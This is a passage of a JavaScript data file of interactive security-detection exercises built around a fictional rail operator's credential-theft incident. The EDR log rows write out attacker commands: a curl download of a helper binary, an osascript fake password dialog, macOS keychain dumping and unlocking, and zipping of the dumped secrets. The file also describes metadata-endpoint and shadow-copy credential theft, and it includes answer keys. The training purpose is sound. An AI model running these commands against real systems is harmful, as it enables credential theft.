      },
      {
        kind: "worksheet",
        title: "Which Rule Earns a 03:00 Call?",
        prompt: "After the gateway, Valentina checked the Git server's secret-scanning rules to see whether any key had ever been pushed. Read the last 90 days of rule results and decide which ones you'd trust.",
        caption: "Secret scanning · Oakmere Git server · last 90 days",
        columns: ["Rule", "Matches on", "Hits", "Confirmed real"],
        rows: [
          ["GIT-11", "the word password", "4,120", "6"],
          ["GIT-12", "password= or api_key=", "1,340", "31"],
          ["GIT-14", "any 40 hex characters", "2,905", "2"],
          ["GIT-15", "-----BEGIN PGP PRIVATE KEY BLOCK-----", "2", "2"],
          ["GIT-16", "-----BEGIN EC PRIVATE KEY-----", "1", "1"],
        ],
        questions: [
          { id: "rate", q: "What percentage of GIT-12's hits were real? Round to a whole number.", hint: "Confirmed real divided by hits, times 100.", answer: ["2", "2%"], why: "31 of 1,340 is about 2%. Patterns that people write in everyday config and prose match far more than secrets." },
          { id: "pick", q: "One rule may wake someone at 03:00. GIT-12 or GIT-15?", hint: "Compare what each rule matches, then the two right-hand columns.", answer: ["GIT-15", "15", "git15"], why: "GIT-15. Key tools write that line at the top of a key file, word for word, and it doesn't turn up in everyday text. So the rule fires rarely, and when it does, key material has moved." },
        ],
      },
    ],
    // ── Reading 4: the Keychain ──
    "uc-r4": [
      {
        kind: "trace",
        title: "What Ran Before the Dump?",
        prompt: "An alert on or-tt-mb04, the timetable designer's MacBook. Valentina doesn't start with the command that fired. Follow the process trail backwards and find out how the vault came to be open.",
        lead: "Alert 10:22, or-tt-mb04, user j.halloran: security dump-keychain -d.",
        steps: [
          {
            id: "dump", ask: "Find the alerting command. What was its parent?", source: "EDR process events · or-tt-mb04",
            columns: ["Time", "Process", "Parent", "Command line"],
            rows: [
              ["10:19:41", "curl", "zsh", "curl -sO https://updates.timetable-tools.example/sync_helper"],
              ["10:20:03", "sync_helper", "launchd", "/Users/j.halloran/Downloads/sync_helper"],
              ["10:21:02", "Safari", "launchd", "/Applications/Safari.app/Contents/MacOS/Safari"],
              ["10:22:11", "security", "sync_helper", "security dump-keychain -d login.keychain-db"],
              ["10:22:40", "zip", "sync_helper", "zip -q /tmp/k.zip /tmp/k.txt"],
            ],
            answer: 3, why: "The parent is sync_helper, a binary downloaded two and a half minutes earlier. Someone at a Terminal would show a shell as the parent.", learned: "dump-keychain ran under sync_helper",
          },
          {
            id: "capture", ask: "That dump only returns secrets from an open vault. Which earlier row got hold of the login password?", source: "EDR process events · or-tt-mb04",
            columns: ["Time", "Process", "Parent", "Command line"],
            rows: [
              ["10:20:03", "sync_helper", "launchd", "/Users/j.halloran/Downloads/sync_helper"],
              ["10:20:05", "osascript", "sync_helper", "osascript -e display dialog \"macOS needs your password to finish this update\" default answer \"\" with hidden answer"],
              ["10:20:49", "sw_vers", "sync_helper", "sw_vers -productVersion"],
              ["10:21:17", "whoami", "sync_helper", "whoami"],
              ["10:22:10", "security", "sync_helper", "security unlock-keychain -p FAKE-Login-Pass login.keychain-db"],
            ],
            answer: 1, why: "osascript drew a fake system dialog with a hidden answer box. j.halloran typed the login password into it, and that same password opens the login keychain by default. The unlock two minutes later is where it got used.", learned: "A fake dialog captured the login password at 10:20",
          },
          {
            id: "copy", ask: "What else was taken from the Mac? Find the copy of the vault file itself.", source: "EDR file events · or-tt-mb04",
            columns: ["Time", "Action", "Path", "Process"],
            rows: [
              ["10:19:44", "FileCreated", "/Users/j.halloran/Downloads/sync_helper", "curl"],
              ["10:22:12", "FileCreated", "/tmp/k.txt", "sync_helper"],
              ["10:22:31", "FileCreated", "/tmp/lk.db (copied from ~/Library/Keychains/login.keychain-db)", "sync_helper"],
              ["10:22:40", "FileCreated", "/tmp/k.zip", "zip"],
            ],
            answer: 2, why: "A copy of login.keychain-db can be parsed offline, with a tool such as Chainbreaker, by anyone who has the password.", learned: "The vault file itself went into /tmp as well",
          },
        ],
        primer: {
          fold: true,
          title: "How a Keychain gets opened",
          points: [
            "The macOS **Keychain** is one encrypted vault. The **login keychain**, `~/Library/Keychains/login.keychain-db`, holds most saved passwords and app tokens. Taking it is **T1555.001**.",
            "By default its unlock password is the account's login password.",
            "The `security` command reads it. `security dump-keychain -d` asks for every item with its secret, and `security find-generic-password -ga NAME` asks for one. Most of those answers come only from an open vault.",
            "The parent process shows who was behind a command: a person at a shell, or a program that was dropped there.",
          ],
          example: {
            label: "Worked example: a browser's password store",
            lines: [
              "Chrome on a Mac keeps logins in a SQLite file called `Login Data`, encrypted. This store is T1555.003.",
              "The key sits in the Keychain as `Chrome Safe Storage`.",
              "A copy of `Login Data` alone gives encrypted rows, so the same question comes up: who could open the vault that holds the key?",
            ],
          },
        },
      },
    ],
    // ── Reading 5: cloud metadata and vault APIs ──
    "uc-r5": [
      {
        kind: "anatomy",
        title: "Read a Finding When the Theft Left No Log",
        prompt: "Sunday, 23:52. The trail has left the depot and reached the cloud, and CloudTrail has no record of anything being taken. What Oakmere does have is this threat detection finding. Read it field by field.",
        source: "Threat detection finding · account 111122223333 · eu-west-2",
        fields: [
          { key: "type", value: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS", label: "What it says", note: "Credentials issued to an EC2 instance's role were used from outside AWS. The .InsideAWS variant means they were used from another AWS account." },
          { key: "severity", value: "8", label: "How serious", note: "GuardDuty's High band runs from 7.0 to 8.9." },
          { key: "resource.accessKeyDetails.userType", value: "AssumedRole", note: "A role's temporary credentials, not a person's long-lived key." },
          { key: "resource.accessKeyDetails.userName", value: "or-ticket-web-role", label: "Whose credentials", note: "The role attached to or-tkt-web01, the ticketing server." },
          { key: "resource.accessKeyDetails.accessKeyId", value: "ASIAOAKMERE2AEXAMPLE", note: "ASIA marks a temporary key. It's the thread to pull in CloudTrail." },
          { key: "service.action.awsApiCallAction.api", value: "GetParameter", label: "What was called" },
          { key: "service.action.awsApiCallAction.serviceName", value: "ssm.amazonaws.com", note: "Parameter Store, part of AWS Systems Manager, which also holds encrypted values." },
          { key: "service.action.awsApiCallAction.remoteIpDetails.ipAddressV4", value: "198.51.100.131", label: "From where", note: "The address the call came from. The finding's OutsideAWS suffix describes this value." },
        ],
        summary: "You can't see the moment of theft, because a request to 169.254.169.254 never reaches a logged API. You see the consequence: the instance's credentials in use somewhere an instance isn't. The next steps are to find what on or-tkt-web01 called the metadata address, and which other calls that access key made.",
        primer: {
          fold: true,
          title: "A secret that comes from the instance itself",
          points: [
            "Code on a cloud instance can ask a link-local address, `169.254.169.254` on AWS, for the instance role's temporary credentials. This is **T1552.005**, Cloud Instance Metadata API.",
            "That request goes to the **instance metadata service**, which isn't a logged AWS management API, so CloudTrail has no entry for it.",
            "**IMDSv1** answers a plain GET. **IMDSv2** first requires a session token, fetched with a PUT. That stops the simple form of server-side request forgery (SSRF), where a web app is tricked into fetching a URL for an attacker.",
            "So you detect what follows: a finding like this one, a web process calling that address, or instances still allowing IMDSv1, which the CloudWatch metric `MetadataNoToken` shows.",
          ],
          example: {
            label: "Worked example: the same idea on Azure",
            lines: [
              "Azure's metadata service uses the same address and requires the header `Metadata: true`.",
              "A token taken from it can then read Key Vault. The vault's diagnostic log shows `SecretGet` by the managed identity.",
              "The token request itself isn't in that log either.",
            ],
          },
        },
      },
      {
        kind: "inspect",
        title: "What a Successful Read Leaves in the Trail",
        prompt: "Somebody is going to ask whether the value was taken. Before that, learn what this trail can and can't tell you. Open each field of an ordinary call from Oakmere's fare batch job.",
        artifact: "CloudTrail record · or-fare-batch-role · Tuesday 04:10",
        items: [
          { id: "f1", text: "eventName: GetParameter", tag: "The call", tone: "info", note: "Parameter Store's read call. Secrets Manager's retrieval calls appear in CloudTrail in the same way, with eventSource secretsmanager.amazonaws.com." },
          { id: "f2", text: "requestParameters.name: /fares/settlement/api-key", tag: "What was asked for", tone: "info", note: "The name is logged, so you can always tell which secret was requested." },
          { id: "f3", text: "requestParameters.withDecryption: true", tag: "Asked for plain text", tone: "info", note: "The caller wanted the value decrypted, not just the stored form." },
          { id: "f4", text: "errorCode: (empty)", tag: "The outcome", tone: "info", note: "CloudTrail fills this field when a call fails. Empty means AWS carried the call out." },
          { id: "f5", text: "responseElements: null", tag: "The value", tone: "info", note: "What came back is left out of the trail, because it would put the secret in the log. You can prove the call and its outcome, and you'll never read the value here." },
          { id: "f6", text: "readOnly: true", tag: "Effect", tone: "info", note: "The call changed nothing. Reading a secret never shows up as a change." },
        ],
      },
    ],
    // ── A warm-up before the first CloudTrail record ──
    "uc-la1": [
      {
        kind: "spotdiff",
        title: "Same Role, Two Callers",
        prompt: "Two CloudTrail records for or-ticket-web-role. One is an ordinary Tuesday on the ticketing server, and the other is the call behind Sunday's finding. Both carry the same identity, so tap the lines that show someone else was holding it.",
        goodTitle: "Tuesday 09:14",
        suspectTitle: "Sunday 23:52",
        good: [
          "eventTime: 2026-10-27T09:14:02Z",
          "eventSource: ssm.amazonaws.com",
          "eventName: GetParameter",
          "awsRegion: eu-west-2",
          "userIdentity.type: AssumedRole",
          "userIdentity.arn: arn:aws:sts::111122223333:assumed-role/or-ticket-web-role/i-0f3a91c7d2b64e015",
          "sourceIPAddress: 10.60.4.21",
          "userAgent: Boto3/1.33.13 md/Botocore#1.33.13 Python/3.12.1 Linux/6.1.0",
          "requestParameters.name: /ticketing/web/session-key",
          "requestID: 6c1d0e52-7f3a-4e19-b1c7-2d94a60f8e13",
          "errorCode: (empty)",
          "readOnly: true",
        ],
        suspect: [
          "eventTime: 2026-11-01T23:52:08Z",
          "eventSource: ssm.amazonaws.com",
          "eventName: GetParameter",
          "awsRegion: eu-west-2",
          "userIdentity.type: AssumedRole",
          "userIdentity.arn: arn:aws:sts::111122223333:assumed-role/or-ticket-web-role/i-0f3a91c7d2b64e015",
          "sourceIPAddress: 198.51.100.131",
          "userAgent: aws-cli/2.17.4 md/awscrt#0.20.11 ua/2.0 os/windows#11 md/arch#x86_64",
          "requestParameters.name: /fares/settlement/api-key",
          "requestID: e07b3f18-92ac-4d6b-8a55-c13f7e40d926",
          "errorCode: (empty)",
          "readOnly: true",
        ],
        diffs: [
          { line: 6, why: "sourceIPAddress: an address on the ticketing subnet before, and now one that isn't in Oakmere's AWS estate at all." },
          { line: 7, why: "userAgent: the application's SDK on Linux before, and now a command-line client on a Windows machine." },
          { line: 8, why: "requestParameters.name: this role reads one parameter, and this is a different one. An identity and a secret that have never been paired before." },
        ],
        decoys: [
          { line: 0, why: "Two records, two times. This line differs on every pair of calls." },
          { line: 9, why: "Every API call gets its own requestID, so this always differs." },
        ],
        lesson: "userIdentity tells you whose credentials were used, and it reads the same for anyone who holds them. sourceIPAddress and userAgent tell you where they were used and with what. For a workload those two fields barely change, so when they change together, the credentials have left the workload. errorCode is empty in both records: both calls worked.",
        hud: "Tap the lines that show a different caller",
        sameLine: "That line reads the same in both records.",
        winTitle: "Every sign of a different caller found",
        howTo: [
          "Compare the two records line by line.",
          "Tap each line that shows a different caller or a different use of the role.",
          "Some lines differ on every call, and a wrong tap costs a life.",
        ],
        primer: {
          fold: true,
          title: "What a role's calls normally look like",
          points: [
            "Temporary credentials are three strings: an access key ID, a secret key and a session token. Whoever holds them can use them, from any machine, until they expire.",
            "CloudTrail writes the role's name on every call, whoever made it. So `userIdentity` says which credentials were used.",
            "`sourceIPAddress` and `userAgent` describe the caller. A workload calls through the SDK in its own runtime, from its own network, and that stays steady for months.",
          ],
          example: {
            label: "Worked example: an API key on another system",
            lines: [
              "The rota app's key calls the payroll API. For 11 months: `client: rota-app/4.2`, `src: 10.60.2.7`.",
              "One morning: `client: python-requests/2.31`, `src: 198.51.100.40`.",
              "The server logs the same key both times. The other two fields are what changed.",
            ],
          },
        },
      },
      {
        kind: "worksheet",
        title: "New Pair, or Old Habit?",
        prompt: "Valentina doesn't count calls. Each row here is one identity reading one parameter, across the whole account, for the last 30 days. Find what a count would have missed.",
        caption: "CloudTrail summary · GetParameter by identity and name · last 30 days",
        columns: ["Identity", "Parameter", "First seen", "Calls"],
        rows: [
          ["or-ticket-web-role", "/ticketing/web/session-key", "2025-03", "41,220"],
          ["or-fare-batch-role", "/fares/settlement/api-key", "2024-11", "8,640"],
          ["or-deploy-runner", "/ticketing/web/session-key", "2025-03", "312"],
          ["or-ticket-web-role", "/fares/settlement/api-key", "Sun 23:52", "1"],
          ["or-ticket-web-role", "/hr/payroll/db-creds", "Sun 23:53", "1"],
          ["or-rota-sync-role", "/rota/export/token", "2026-01", "2,880"],
        ],
        questions: [
          { id: "new", q: "How many rows are a pairing that didn't exist before this week?", hint: "Read the First seen column.", answer: ["2", "two"], why: "Two: or-ticket-web-role reading parameters it had never touched." },
          { id: "rule", q: "A rule alerts above 1,000 calls in a day. Would it fire on those new pairings? (yes/no)", hint: "Compare their Calls with the threshold.", answer: ["no", "n"], why: "No. Each one is a single call, while the ticketing role's normal traffic passes 1,000 a day and would fire all month. The signal is the pairing, not the count." },
        ],
      },
    ],
    // ── Reading 6: a detection program ──
    "uc-r6": [
      {
        kind: "match",
        title: "Five Gaps, Five Habits",
        prompt: "Valentina's write-up for the board lists five gaps that this incident exposed. Match each one to the practice that closes it.",
        pairs: [
          { id: "p1", left: "A password was committed at 16:02, and nobody noticed for a year", right: "Scan every commit, and sweep shares on a schedule", why: "Continuous secret scanning finds an exposure before an attacker needs to go looking." },
          { id: "p2", left: "An access key on the gateway has been valid since 2021", right: "Replace static keys with roles that expire", why: "Short-lived credentials leave no long-lived file waiting to be found." },
          { id: "p3", left: "Nothing can tell a real read of the share from everyday noise", right: "Plant a canary that nothing should ever touch", why: "A honeytoken has no legitimate reader, so any access to it is a high-confidence alert." },
          { id: "p4", left: "A count rule fires every time the deploy runs", right: "Baseline which identity reads which secret", why: "Automation runs in bursts, and only the pairing separates normal from new." },
          { id: "p5", left: "The file is gone, but nobody knows who read it", right: "Rotate the credential", why: "There's no way to count past reads, so only a new value closes the exposure." },
        ],
      },
      {
        kind: "outbreak",
        title: "One Password, Every Depot",
        prompt: "The svc-depot password has been pasted into scripts across the depots, so every link on this map opens with it. Valentina runs this drill to make a point about the cleanup plan: you get one tool, isolating one host a turn. Keep the intruder off TICKETING, and notice what that costs you.",
        hostPrefix: "OR-DP",
        cols: 6,
        rows: 5,
        crown: "TICKETING",
        via: "the svc-depot password pasted into a script on every host",
        lesson: "Count the hosts you gave up. You were chasing copies of a password one machine at a time, and it worked everywhere until you got there. Isolation holds one host, and deleting a script removes one copy. Rotating svc-depot's password changes the value, so every pasted copy goes dead in the same moment, including any the intruder already took away. Plan the rotation with the job owner, so that the depots don't stop, and then fix the script so the new password isn't pasted into it.",
        primer: {
          fold: true,
          title: "What each cleanup action really closes",
          points: [
            "Deleting a file removes one copy. It can't touch copies already taken, and you can't tell how many times it was read.",
            "**Rotation** changes the value, so every copy, known and unknown, stops working together.",
            "So on any confirmed exposure, rotation is the fix, and removing the file is tidying up.",
          ],
          example: {
            label: "Worked example: a lost depot key",
            lines: [
              "A master key is found on a bench, and somebody could have copied it.",
              "Taking it back removes that one key. Re-keying the locks makes every copy useless.",
            ],
          },
        },
      },
    ],
    // ── A warm-up before the verdict ──
    "uc-ac1": [
      {
        kind: "queue",
        title: "Four Alerts on One Vault",
        prompt: "The week after the incident, every rule on Parameter Store is turned up and the queue is noisy. Valentina hands you four. Open each one, compare it with what's on file, and give it a verdict.",
        console: "SIEM · Incidents",
        actions: [
          { id: "tp", label: "True Positive", tone: "escalate" },
          { id: "btp", label: "Benign True Positive", tone: "close" },
          { id: "fp", label: "False Positive", tone: "close" },
        ],
        alerts: [
          {
            id: "a1", time: "Mon 08:05", severity: "Medium", rule: "Parameter read burst", entity: "or-ticket-web-role",
            fields: [{ k: "eventName", v: "GetParameter" }, { k: "calls", v: "40 in 3 minutes" }, { k: "name", v: "/ticketing/web/session-key" }, { k: "sourceIPAddress", v: "40 addresses in 10.60.4.0/24" }, { k: "userAgent", v: "Boto3/1.33.13 ... Linux/6.1.0" }],
            context: "Auto Scaling history shows 40 instances launched at 08:03 for the Monday peak. This role has read this one parameter at every boot since 2025.",
            answer: "btp", why: "The rule did what it should: there really was a burst. The burst is a scale-out, with the same identity, parameter and subnet as ever, and the scaling record matches the minute.",
          },
          {
            id: "a2", time: "Sun 01:14", severity: "High", rule: "New identity and parameter pair", entity: "or-deploy-runner",
            fields: [{ k: "eventName", v: "GetParameter" }, { k: "calls", v: "3" }, { k: "name", v: "/hr/payroll/db-creds" }, { k: "sourceIPAddress", v: "10.60.9.14, the runner" }, { k: "userAgent", v: "aws-sdk-go-v2/1.30.0 ..." }],
            context: "The runner's change record covers ticketing releases, Sundays at 02:30, and no release ran this Sunday. In 20 months it has never read an /hr parameter.",
            answer: "tp", why: "The address and client are the usual ones, but those describe the machine, not whoever is using it. The pairing is new, and no job on file explains it. Only three calls, and it's still the worst alert here.",
          },
          {
            id: "a3", time: "Tue 11:20", severity: "Low", rule: "Secret value read", entity: "or-audit-role",
            fields: [{ k: "eventName", v: "DescribeParameters" }, { k: "calls", v: "1" }, { k: "sourceIPAddress", v: "10.60.2.30" }, { k: "userAgent", v: "aws-cli/2.17.4 ..." }],
            context: "The rule's event list includes DescribeParameters. That call returns names and metadata, and never a value.",
            answer: "fp", why: "No value was read, so the thing this rule looks for never happened. Fix the rule's event list.",
          },
          {
            id: "a4", time: "Wed 03:41", severity: "Critical", rule: "Canary parameter touched", entity: "or-fare-batch-role",
            fields: [{ k: "eventName", v: "GetParameter" }, { k: "calls", v: "1" }, { k: "name", v: "/canary/ticketing-admin" }, { k: "sourceIPAddress", v: "10.60.6.12" }, { k: "userAgent", v: "Boto3/1.33.13 ..." }],
            context: "This parameter was planted in 2025, and nothing in the estate is configured to use it.",
            answer: "tp", why: "A canary has no honest reader, so inside address and familiar client don't matter. One call is enough to act on.",
          },
        ],
        primer: {
          fold: true,
          title: "Three words for three outcomes",
          points: [
            "**True Positive:** the rule fired and the activity is an attack.",
            "**Benign True Positive:** the rule fired correctly on real activity, and that activity turns out to be authorised.",
            "**False Positive:** the rule fired on something that isn't what it looks for.",
            "CI/CD pipelines, autoscaling and other automation read in bursts, so the size of a burst decides nothing.",
            "Check the identity, the source, the call and the timing against what's on file. A change record only helps if it names that identity and that time.",
          ],
          example: {
            label: "Worked example: another rule, another system",
            lines: [
              "Rule `Internal port scan` fired on Tuesday at 14:00.",
              "The scan really happened, and the source is the vulnerability scanner, inside its booked window.",
              "The rule was right, and the activity was authorised: Benign True Positive.",
            ],
          },
        },
      },
    ],
    // ── Reading 7: file-access telemetry ──
    "uc-r7": [
      {
        kind: "anatomy",
        title: "Read One Object-Access Record",
        prompt: "or-sig-db01 runs TrackAccess, the system that decides who may open which trackside cabinet. Its database has an audit rule on it. Before you look at Sunday night, read an ordinary record from when the service started.",
        source: "Windows Security log · or-sig-db01 · Event 4663",
        fields: [
          { key: "EventID", value: "4663", label: "What", note: "An attempt was made to access an object. It's only written where someone has put a SACL, an audit rule, on that object." },
          { key: "SubjectUserName", value: "svc-trackaccess", label: "As whom", note: "The account using the handle." },
          { key: "ObjectType", value: "File" },
          { key: "ObjectName", value: "D:\\TrackAccess\\trackaccess.edb", label: "Which object", note: "The path that was reached. A live file shows its drive-letter path. A file reached inside a Volume Shadow Copy shows a device path instead, in the form \\Device\\HarddiskVolumeShadowCopyN\\..." },
          { key: "HandleId", value: "0x1c4", note: "The open handle this access used." },
          { key: "AccessList", value: "%%4416", label: "Which right", note: "The right used, as an untranslated code. %%4416 is ReadData, or ListDirectory on a folder." },
          { key: "AccessMask", value: "0x1", note: "The same right as a number." },
          { key: "ProcessName", value: "D:\\TrackAccess\\bin\\tasvc.exe", label: "With what", note: "The program that opened the object." },
        ],
        summary: "This was written at 05:02, when the service started and opened its database. Clients have queried TrackAccess all day since, over RPC, and none of those queries wrote a 4663, because the service answers them through the handle it already holds. A new record means something opened or used the file in a new way, and the route it took is in ObjectName.",
        primer: {
          fold: true,
          title: "How a locked file gets read",
          points: [
            "A service that runs a database usually holds the file locked for as long as it runs, so nothing else can simply open it.",
            "`ntds.dit`, the Active Directory database on every domain controller, is one of those files. The AD DS service holds it while the DC runs.",
            "A **Volume Shadow Copy (VSS)** is a point-in-time snapshot of a volume. Tools such as `vssadmin` and `diskshadow` create one, and files inside it can be read with no lock in the way.",
            "Domain controllers replicate by talking to each other's AD DS service over **DRSUAPI**, a directory replication protocol.",
          ],
          example: {
            label: "Worked example: another locked database",
            lines: [
              "SQL Server holds `fares.mdf` open, so `copy D:\\Data\\fares.mdf E:\\` fails with a sharing violation.",
              "A backup product asks VSS for a snapshot and reads the file from there, while SQL Server keeps running.",
            ],
          },
        },
      },
      {
        kind: "spotdiff",
        title: "One Database, Two Routes",
        prompt: "Late on Sunday, minutes after the cloud read, the same SACL on or-sig-db01 fired again. Lay the new record beside the 05:02 one. Tap the lines that tell you how this reader reached the file.",
        goodTitle: "Monday 05:02, service start",
        suspectTitle: "Sunday 23:58",
        good: [
          "TimeCreated: 2026-10-26T05:02:17Z",
          "EventID: 4663",
          "Computer: or-sig-db01.oakmererail.example",
          "SubjectUserName: svc-trackaccess",
          "SubjectDomainName: OAKMERE",
          "SubjectLogonId: 0x2A91E",
          "ObjectServer: Security",
          "ObjectType: File",
          "ObjectName: D:\\TrackAccess\\trackaccess.edb",
          "HandleId: 0x1c4",
          "AccessList: %%4416",
          "AccessMask: 0x1",
          "ProcessName: D:\\TrackAccess\\bin\\tasvc.exe",
        ],
        suspect: [
          "TimeCreated: 2026-11-01T23:58:40Z",
          "EventID: 4663",
          "Computer: or-sig-db01.oakmererail.example",
          "SubjectUserName: adm-p.iyer",
          "SubjectDomainName: OAKMERE",
          "SubjectLogonId: 0x4B1F2C",
          "ObjectServer: Security",
          "ObjectType: File",
          "ObjectName: \\Device\\HarddiskVolumeShadowCopy2\\TrackAccess\\trackaccess.edb",
          "HandleId: 0x9d8",
          "AccessList: %%4416",
          "AccessMask: 0x1",
          "ProcessName: C:\\Windows\\System32\\esentutl.exe",
        ],
        diffs: [
          { line: 8, why: "ObjectName: a device path, not the drive-letter path. The read went through shadow copy number 2." },
          { line: 12, why: "ProcessName: esentutl.exe, a Windows database utility whose /vss option copies a locked file through a snapshot. The service itself isn't the reader here." },
          { line: 3, why: "SubjectUserName: a named admin account in place of the service account. It holds the rights to do this." },
        ],
        decoys: [
          { line: 0, why: "A different time, which you'd expect from two separate records." },
          { line: 5, why: "SubjectLogonId is issued per logon session, so two sessions never match." },
          { line: 9, why: "HandleId is issued per open handle, so it differs every time." },
        ],
        lesson: "AccessList reads the same in both, because both are plain reads. What differs is the route. A device-path ObjectName is the mark left by going around a lock, through a snapshot somebody made on purpose. That's a strong lead, but it only covers that route: a raw-volume reader, or a method that never touches the file, leaves no such path. Now the questions move from what happened to whether anything explains it.",
        hud: "Tap the lines that show how this reader got in",
        sameLine: "That line reads the same in both records.",
        winTitle: "The whole route found",
        howTo: [
          "Compare the two records line by line.",
          "Tap each line that shows who reached the file, and how.",
          "Some fields change with every record, and a wrong tap costs a life.",
        ],
      },
    ],
    // ── A warm-up before the ordering task ──
    "uc-o1": [
      {
        kind: "sequence",
        title: "Follow One Secret to the Next",
        prompt: "Valentina's incident timeline got shuffled when the slides were merged. Put Oakmere's chain back in order. Each step only became possible because of what the step before it handed over.",
        items: [
          { id: "s3", text: "The svc-depot password opens an SSH session on or-dp-gw1" },
          { id: "s6", text: "Those credentials read /fares/settlement/api-key from an address outside AWS" },
          { id: "s1", text: "depot_sync.ps1, with a password typed into it, is saved to the Handover share" },
          { id: "s5", text: "On or-tkt-web01, a request to 169.254.169.254 returns the role's temporary credentials" },
          { id: "s2", text: "l.brandt's forgotten account searches the share and copies the script" },
          { id: "s4", text: "The gateway's shell history names a private key, and that key opens or-tkt-web01" },
        ],
        order: ["s1", "s2", "s3", "s4", "s5", "s6"],
        doneNote: "An exposure sits there, someone collects it, it gets used, and from the new position they search again. Each found secret is the way to the next. That's why one forgotten line in a script ended up at a cloud parameter.",
      },
    ],
    // ── A warm-up before the boss record ──
    "uc-la2": [
      {
        kind: "simulate",
        title: "Could They, and Should They?",
        prompt: "Four reads of the TrackAccess database by accounts that hold the rights. Run each through Valentina's three questions, and watch which one separates them.",
        checks: [
          { name: "Holds the right", question: "Can this account do this at all?" },
          { name: "On file", question: "Does a job or a ticket name this account for this?" },
          { name: "Usual route", question: "Is this how that work normally reaches the file?" },
        ],
        scenarios: [
          { id: "export", label: "svc-taexport, nightly export", detail: "A scheduled export that runs on or-sig-db01 through tasvc's own export call.", results: ["pass", "pass", "pass"], why: ["It's a member of the TrackAccess operators group.", "The job schedule names it.", "It has used the same route for two years."], verdict: "Expected. It closes with a note, and the baseline stays as it was." },
          { id: "upgrade", label: "adm-p.iyer, version upgrade", detail: "tasvc stopped for an hour, and the file copied from its live path while nothing held the lock.", results: ["pass", "pass", "pass"], why: ["A server administrator.", "Change RFC-2204 names the account, this server and this window.", "The vendor's upgrade guide describes exactly this."], verdict: "Expected, because the record and the ticket agree on every detail." },
          { id: "sunday", label: "adm-p.iyer, Sunday 23:58", detail: "esentutl.exe reading through a shadow copy. There's no ticket, and P. Iyer was on leave.", results: ["pass", "fail", "fail"], why: ["The same administrator rights as the upgrade.", "Nothing on file names this work.", "Nothing at Oakmere reads this database through a snapshot."], verdict: "Open an incident. The rights are the same as in the upgrade, and this time nothing else fits." },
          { id: "borrowed", label: "svc-taexport, from a new tool", detail: "The export account, but the process is a copied binary reading through a shadow copy.", results: ["pass", "pass", "fail"], why: ["The account's rights haven't changed.", "The job schedule does name this account.", "The job never runs this binary, and it never reads through a snapshot."], verdict: "Open an incident. A real job's name on the wrong route suggests someone is borrowing the account." },
        ],
        primer: {
          fold: true,
          title: "Two different questions",
          points: [
            "Rights answer *could this account do it?*",
            "What's on file answers *was this meant to happen?* Look for a named job, a ticket, an owner who confirms it.",
            "The route answers *does it match how that work is done?* Compare the process and the path with past records.",
          ],
          example: {
            label: "Worked example: a payroll folder",
            lines: [
              "An HR manager opens the payroll folder. The permission is valid, and the month-end calendar names this person: both answers fit.",
              "The same manager's account copies the whole folder to a USB drive. The permission is just as valid, and nothing on file covers it.",
            ],
          },
        },
      },
    ],
    // ── A warm-up before the flag ──
    "uc-f1": [
      {
        kind: "anatomy",
        title: "Read the Client Inside a Record",
        prompt: "After the incident, Oakmere's audit role listed every fare secret so that each one could be rotated. A CloudTrail record names the client behind each call in one string. Read how that string is built, so that you can pull one exact part out of it.",
        source: "CloudTrail record · or-audit-role · Thursday 10:02",
        fields: [
          { key: "eventName", value: "ListSecrets", label: "The call", note: "Lists secrets and their metadata, with no values." },
          { key: "eventSource", value: "secretsmanager.amazonaws.com" },
          { key: "userIdentity.type", value: "AssumedRole" },
          { key: "userAgent", value: "aws-sdk-java/2.25.40 Linux/6.1.0 OpenJDK_64-Bit_Server_VM/17.0.10 Java/17.0.10", label: "The client", note: "A run of name/version pairs, separated by spaces. Each pair describes one layer of the software that made the call." },
          { key: "errorCode", value: "(empty)" },
        ],
        summary: "Read it left to right, one pair at a time. Here aws-sdk-java/2.25.40 is the AWS library the code called, the next pair is the operating system, and the last two are the Java runtime. The same string tells you whether the caller was an SDK or a hand-run tool such as aws-cli. When a question asks for one part, copy that pair character for character.",
      },
    ],
  },
};
